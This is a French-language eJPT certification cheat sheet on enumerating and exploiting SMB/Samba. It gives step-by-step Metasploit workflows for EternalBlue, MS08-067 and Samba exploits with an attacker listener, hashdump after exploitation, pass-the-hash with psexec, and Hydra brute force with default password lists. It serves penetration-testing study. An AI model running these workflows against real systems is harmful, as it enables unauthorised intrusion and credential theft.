# 📂 SMB/SAMBA Enumeration & Exploitation - Cheatsheet eJPT

## 🔍 1. Scripts Nmap pour SMB/SAMBA

### Scripts de découverte SMB (Ports 139, 445)
| Script | Description | Usage |
|--------|-------------|-------|
| `smb-os-discovery` | Détection OS et version SMB | `nmap --script smb-os-discovery target` |
| `smb-protocols` | Protocoles SMB supportés | `nmap --script smb-protocols target` |
| `smb-security-mode` | Mode de sécurité SMB | `nmap --script smb-security-mode target` |
| `smb-enum-shares` | Énumération des partages | `nmap --script smb-enum-shares target` |
| `smb-enum-users` | Énumération des utilisateurs | `nmap --script smb-enum-users target` |
| `smb-enum-domains` | Énumération des domaines | `nmap --script smb-enum-domains target` |
| `smb-enum-groups` | Énumération des groupes | `nmap --script smb-enum-groups target` |
| `smb-enum-processes` | Processus en cours | `nmap --script smb-enum-processes target` |
| `smb-enum-sessions` | Sessions actives | `nmap --script smb-enum-sessions target` |
| `smb-server-stats` | Statistiques serveur | `nmap --script smb-server-stats target` |
| `smb-system-info` | Informations système | `nmap --script smb-system-info target` |

### Scripts de vulnérabilités SMB
| Script | CVE | Description | Usage |
|--------|-----|-------------|-------|
| `smb-vuln-ms17-010` | CVE-2017-0144 | EternalBlue | `nmap --script smb-vuln-ms17-010 target` |
| `smb-vuln-ms08-067` | CVE-2008-4250 | NetAPI Buffer Overflow | `nmap --script smb-vuln-ms08-067 target` |
| `smb-vuln-ms10-054` | CVE-2010-2550 | SMB Pool Overflow | `nmap --script smb-vuln-ms10-054 target` |
| `smb-vuln-ms10-061` | CVE-2010-3338 | Print Spooler | `nmap --script smb-vuln-ms10-061 target` |
| `smb-vuln-ms06-025` | CVE-2006-2370 | RAS RPC Service | `nmap --script smb-vuln-ms06-025 target` |
| `smb-vuln-cve2009-3103` | CVE-2009-3103 | SMBv2 Negotiate | `nmap --script smb-vuln-cve2009-3103 target` |
| `smb-vuln-regsvc-dos` | - | Registry Service DoS | `nmap --script smb-vuln-regsvc-dos target` |

### Scripts d'attaque SMB
| Script | Description | Usage |
|--------|-------------|-------|
| `smb-brute` | Brute force SMB | `nmap --script smb-brute target` |
| `smb-flood` | Flood attack | `nmap --script smb-flood target` |
| `smb-ls` | Lister fichiers partages | `nmap --script smb-ls target` |
| `smb-print-text` | Envoyer texte imprimante | `nmap --script smb-print-text target` |

---

## 🎯 2. Commandes Nmap SMB essentielles

### Énumération SMB complète
```bash
# Scan complet SMB avec tous les scripts
nmap -p139,445 --script smb-* target

# Énumération de base (ESSENTIEL eJPT)
nmap -p139,445 --script smb-os-discovery,smb-security-mode,smb-enum-shares target

# Test vulnérabilités critiques (PRIORITÉ eJPT)
nmap -p139,445 --script smb-vuln-ms17-010,smb-vuln-ms08-067 target

# Énumération utilisateurs et groupes
nmap -p139,445 --script smb-enum-users,smb-enum-groups,smb-enum-domains target
```

### Scripts avec authentification
```bash
# Avec credentials trouvés
nmap --script smb-enum-shares --script-args smbusername=user,smbpassword=pass target

# Avec hash NTLM
nmap --script smb-enum-shares --script-args smbusername=user,smbhash=hash target

# Lister fichiers avec auth
nmap --script smb-ls --script-args smbusername=user,smbpassword=pass,share=C$ target
```

---

## 🛠️ 3. Modules Metasploit pour SMB/SAMBA

### Modules de scanning/énumération
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/smb/smb_version` | Version SMB/OS | `use auxiliary/scanner/smb/smb_version` |
| `auxiliary/scanner/smb/smb_enumshares` | Énumération partages | `use auxiliary/scanner/smb/smb_enumshares` |
| `auxiliary/scanner/smb/smb_enumusers` | Énumération utilisateurs | `use auxiliary/scanner/smb/smb_enumusers` |
| `auxiliary/scanner/smb/smb_lookupsid` | Énumération SID | `use auxiliary/scanner/smb/smb_lookupsid` |
| `auxiliary/scanner/smb/smb_login` | Brute force SMB | `use auxiliary/scanner/smb/smb_login` |
| `auxiliary/scanner/smb/smb2` | SMBv2 support | `use auxiliary/scanner/smb/smb2` |
| `auxiliary/scanner/smb/smb_ms17_010` | Check EternalBlue | `use auxiliary/scanner/smb/smb_ms17_010` |
| `auxiliary/scanner/smb/pipe_auditor` | Named pipes enum | `use auxiliary/scanner/smb/pipe_auditor` |

### Modules d'exploitation SMB Windows
| Module | CVE | Cible | Description |
|--------|-----|-------|-------------|
| `exploit/windows/smb/ms17_010_eternalblue` | CVE-2017-0144 | Win 7/8/10/2016 | EternalBlue RCE |
| `exploit/windows/smb/ms08_067_netapi` | CVE-2008-4250 | Win XP/2003/Vista | NetAPI Buffer Overflow |
| `exploit/windows/smb/ms09_050_smb2_negotiate_func_index` | CVE-2009-3103 | Win Vista/7/2008 | SMBv2 Negotiate |
| `exploit/windows/smb/ms10_054_queryfs_pool_overflow` | CVE-2010-2550 | Win 7/Vista/2008 | Pool Overflow |
| `exploit/windows/smb/ms06_025_rasmans_reg` | CVE-2006-2370 | Win 2000/XP/2003 | RAS Service |

### Modules d'exploitation SAMBA Linux
| Module | CVE | Cible | Description |
|--------|-----|-------|-------------|
| `exploit/multi/samba/usermap_script` | CVE-2007-2447 | Samba 3.0.20-3.0.25rc3 | Username map script |
| `exploit/linux/samba/is_known_pipename` | CVE-2017-7494 | Samba 3.5.0-4.6.4 | SambaCry RCE |
| `exploit/linux/samba/setinfopolicy_heap` | CVE-2012-1182 | Samba 3.6.3-4.6.16 | Heap overflow |

### Modules d'administration
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/admin/smb/psexec_command` | Exécution commandes | `use auxiliary/admin/smb/psexec_command` |
| `auxiliary/admin/smb/samba_symlink_traversal` | Directory traversal | `use auxiliary/admin/smb/samba_symlink_traversal` |

---

## 🔧 4. Workflow Metasploit pour SMB

### Configuration de base
```bash
msfconsole -q
workspace -a smb_enum
setg RHOSTS target_ip
```

### Séquence d'énumération SMB (WORKFLOW eJPT)
```bash
# 1. Détection version SMB/OS (CRITIQUE)
use auxiliary/scanner/smb/smb_version
set RHOSTS target
run

# 2. Énumération des partages (ESSENTIEL)
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS target
run

# 3. Check EternalBlue (PRIORITÉ #1 eJPT)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS target
run

# 4. Énumération utilisateurs
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS target
run

# 5. Si EternalBlue détecté → EXPLOITATION
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker_ip
check
exploit
```

---

## 🔍 5. Outils tiers essentiels

### enum4linux (INCONTOURNABLE eJPT)
```bash
# Énumération complète
enum4linux target

# Options spécifiques
enum4linux -a target                    # Tout énumérer
enum4linux -U target                    # Utilisateurs seulement
enum4linux -S target                    # Partages seulement
enum4linux -G target                    # Groupes seulement
enum4linux -P target                    # Policy password
enum4linux -o target                    # OS information
enum4linux -A target                    # Agressif (tout)

# Avec credentials
enum4linux -u user -p password target
enum4linux -u user -p password -a target
```

### smbclient (Client SMB natif)
```bash
# Lister les partages
smbclient -L target
smbclient -L target -N                   # Null session
smbclient -L target -U username

# Se connecter à un partage
smbclient //target/share
smbclient //target/C$ -U administrator
smbclient //target/IPC$ -N               # IPC avec null session

# Commandes dans smbclient
ls                                       # Lister fichiers
cd directory                            # Changer répertoire
get filename                            # Télécharger fichier
put filename                            # Uploader fichier
mget *                                   # Télécharger tout
prompt off                              # Désactiver prompts
recurse on                              # Mode récursif
```

### smbmap (Mapping des partages)
```bash
# Énumération basique
smbmap -H target
smbmap -H target -u null                # Null session
smbmap -H target -u guest               # Guest access

# Avec credentials
smbmap -H target -u username -p password
smbmap -H target -u administrator -p password

# Options avancées
smbmap -H target -u user -p pass -R     # Récursif
smbmap -H target -u user -p pass -r sharename  # Partage spécifique
smbmap -H target -u user -p pass -A filename   # Télécharger fichier
smbmap -H target -u user -p pass --upload filename sharename  # Upload

# Avec hash NTLM
smbmap -H target -u username -p 'aad3b435b51404eeaad3b435b51404ee:hash'
```

### rpcclient (RPC Client)
```bash
# Connexion null session
rpcclient -U "" target
rpcclient -U "" -N target

# Avec credentials
rpcclient -U username target

# Commandes utiles dans rpcclient
enumdomusers                            # Énumérer utilisateurs
enumdomgroups                           # Énumérer groupes
queryuser 0x1f4                         # Info utilisateur (RID 500 = Administrator)
querygroupmem 0x200                     # Membres groupe (RID 512 = Domain Admins)
getdompwinfo                            # Policy mots de passe
netshareenum                            # Partages réseau
srvinfo                                 # Info serveur
```

### nbtscan (NetBIOS Scanner)
```bash
# Scan NetBIOS
nbtscan target
nbtscan 192.168.1.0/24                  # Scan réseau
nbtscan -r 192.168.1.0/24               # Avec résolution noms
nbtscan -v target                       # Verbose
```

---

## 💀 6. Brute Force SMB avec Hydra

### Syntaxe Hydra pour SMB
```bash
hydra [OPTIONS] smb://target
```

### Brute force SMB avec Hydra
```bash
# Brute force utilisateur unique
hydra -l administrator -P passwords.txt smb://target

# Brute force liste d'utilisateurs
hydra -L users.txt -P passwords.txt -t 16 -f smb://target

# Avec domaine spécifique
hydra -l 'DOMAIN\username' -P passwords.txt smb://target

# Options recommandées SMB
hydra -L users.txt -P passwords.txt -t 16 -f -V -o smb_results.txt smb://target
```

### Wordlists SMB spécialisées
```bash
# Utilisateurs Windows courants
cat > smb_users.txt << EOF
administrator
admin
guest
user
backup
service
operator
support
test
demo
EOF

# Mots de passe Windows/SMB courants
cat > smb_passwords.txt << EOF
password
Password123
admin
123456
password123
administrator
guest
user
welcome
qwerty
letmein
Password1
Admin123
EOF
```

---

## 🎯 7. Exploitation selon détection

### Windows - EternalBlue (MS17-010) ⭐ PRIORITÉ eJPT
```bash
# 1. Détection EternalBlue
nmap --script smb-vuln-ms17-010 -p445 target
# OU
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS target
run

# 2. Si VULNERABLE → Exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker_ip
check                                    # Vérifier avant exploit
exploit

# 3. Si succès → Session Meterpreter
sysinfo
getuid
hashdump
```

### Windows - MS08-067 (Conficker)
```bash
# 1. Détection MS08-067
nmap --script smb-vuln-ms08-067 -p445 target

# 2. Exploitation
use exploit/windows/smb/ms08_067_netapi
set RHOSTS target
set LHOST attacker_ip
exploit
```

### Linux - Samba usermap_script (CVE-2007-2447)
```bash
# 1. Détection version Samba
enum4linux target | grep "Samba"
smbclient -L target | head

# 2. Si Samba 3.0.20-3.0.25rc3 → Exploitation
use exploit/multi/samba/usermap_script
set RHOSTS target
set LHOST attacker_ip
exploit
```

### Linux - SambaCry (CVE-2017-7494)
```bash
# 1. Détection version Samba 3.5.0-4.6.4
enum4linux target

# 2. Exploitation SambaCry
use exploit/linux/samba/is_known_pipename
set RHOSTS target
set LHOST attacker_ip
exploit
```

---

## 🔑 8. Techniques d'accès SMB

### Null Sessions (Très fréquent eJPT)
```bash
# Test null session
smbclient -L target -N
rpcclient -U "" -N target
enum4linux -a target

# Énumération via null session
smbmap -H target -u null
nbtscan target
```

### Accès Guest
```bash
# Test compte guest
smbclient -L target -U guest
smbclient //target/share -U guest
enum4linux -u guest -p "" target
```

### Pass-the-Hash
```bash
# Avec smbclient et hash NTLM
smbclient //target/C$ -U administrator --pw-nt-hash hash

# Avec smbmap
smbmap -H target -u administrator -p 'aad3b435b51404eeaad3b435b51404ee:ntlmhash'

# Avec Metasploit psexec
use exploit/windows/smb/psexec
set RHOSTS target
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:ntlmhash
exploit
```

---

## 📋 9. Scripts automatisés SMB

### Script d'énumération SMB complet
```bash
#!/bin/bash
TARGET=$1

echo "[+] SMB Enumeration for $TARGET"

echo "[*] Basic SMB scan..."
nmap -p139,445 -sV $TARGET

echo "[*] OS Discovery..."
nmap --script smb-os-discovery -p445 $TARGET

echo "[*] Share enumeration..."
nmap --script smb-enum-shares -p445 $TARGET

echo "[*] Vulnerability scan..."
nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067 -p445 $TARGET

echo "[*] enum4linux scan..."
enum4linux -a $TARGET

echo "[*] smbclient null session test..."
smbclient -L $TARGET -N

echo "[*] smbmap scan..."
smbmap -H $TARGET -u null

echo "[+] SMB enumeration completed"
```

### One-liner SMB discovery
```bash
# Test rapide SMB complet
nmap -p445 --script smb-os-discovery,smb-enum-shares,smb-vuln-ms17-010 target && enum4linux -a target && smbclient -L target -N
```

---

## 🎯 10. Cas d'usage spécifiques eJPT

### Scénario 1: Windows avec EternalBlue
```bash
# 1. Découverte SMB
nmap -p445 -sV target

# 2. Test EternalBlue
nmap --script smb-vuln-ms17-010 target

# 3. Si vulnérable → Exploitation directe
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker_ip
exploit

# 4. Post-exploitation
sysinfo && getuid && hashdump
```

### Scénario 2: Null session avec énumération
```bash
# 1. Test null session
enum4linux -a target

# 2. Si null session OK → Énumération poussée
smbclient -L target -N
smbmap -H target -u null
rpcclient -U "" -N target
# Dans rpcclient: enumdomusers, enumdomgroups

# 3. Brute force avec utilisateurs trouvés
hydra -L found_users.txt -P passwords.txt smb://target
```

### Scénario 3: Samba Linux
```bash
# 1. Détection Samba
enum4linux target | grep Samba

# 2. Si version vulnérable → Exploitation
use exploit/multi/samba/usermap_script
set RHOSTS target
set LHOST attacker_ip
exploit
```

---

## 🚨 11. Indicateurs de vulnérabilités SMB

### Versions Windows vulnérables
| OS | EternalBlue | MS08-067 | Autres |
|----|-------------|----------|---------|
| **Windows XP** | ❌ | ✅ | MS06-025, MS09-050 |
| **Windows 2003** | ❌ | ✅ | MS06-025, MS09-050 |
| **Windows Vista** | ❌ | ✅ | MS09-050, MS10-054 |
| **Windows 7** | ✅ | ❌ | MS10-054, MS10-061 |
| **Windows 8** | ✅ | ❌ | Rare |
| **Windows 10** | ✅ (old) | ❌ | Patchés rapidement |
| **Windows 2008** | ✅ | ❌ | MS10-054 |
| **Windows 2012** | ✅ | ❌ | MS10-054 |
| **Windows 2016** | ✅ | ❌ | Rare |

### Versions Samba vulnérables
| Version | CVE | Exploit |
|---------|-----|---------|
| **3.0.20-3.0.25rc3** | CVE-2007-2447 | usermap_script |
| **3.5.0-4.6.4** | CVE-2017-7494 | SambaCry |
| **3.6.3-4.6.16** | CVE-2012-1182 | setinfopolicy_heap |

---

## 💡 12. Conseils et astuces eJPT

### Workflow SMB recommandé pour eJPT
1. **Découverte** : `nmap -p139,445 -sV target`
2. **OS/Version** : `nmap --script smb-os-discovery target`
3. **EternalBlue check** : `nmap --script smb-vuln-ms17-010 target`
4. **Si EternalBlue** → Exploitation directe
5. **Si pas EternalBlue** → enum4linux + null sessions
6. **Brute force** si nécessaire

### Points critiques eJPT
- **EternalBlue = priorité #1** : Très fréquent dans les labs
- **enum4linux** : Outil incontournable, utiliser systématiquement
- **Null sessions** : Souvent autorisées dans eJPT
- **Samba usermap_script** : Exploit Linux très courant
- **Always check 139 AND 445** : Deux ports à scanner

### Erreurs courantes à éviter
- Ne pas tester **null sessions** en premier
- Oublier de vérifier **version Samba** sur Linux
- Ignorer le **port 139** (focus uniquement sur 445)
- Ne pas utiliser **enum4linux** systématiquement
- Manquer **EternalBlue** sur Windows 7/2008/2016

### One-liners critiques eJPT
```bash
# Check EternalBlue rapide
nmap --script smb-vuln-ms17-010 -p445 target | grep "VULNERABLE"

# Enum complet one-shot
enum4linux -a target && smbclient -L target -N && smbmap -H target

# Test null session multi-outils
smbclient -L target -N; smbmap -H target -u null; rpcclient -U "" -N target
```

**🎯 Conseil final eJPT :** SMB est LE service le plus exploité dans l'eJPT. Pattern typique : découverte → check EternalBlue → si oui exploitation directe, si non enum4linux + null sessions + brute force. Maîtriser enum4linux et EternalBlue = 50% du succès eJPT !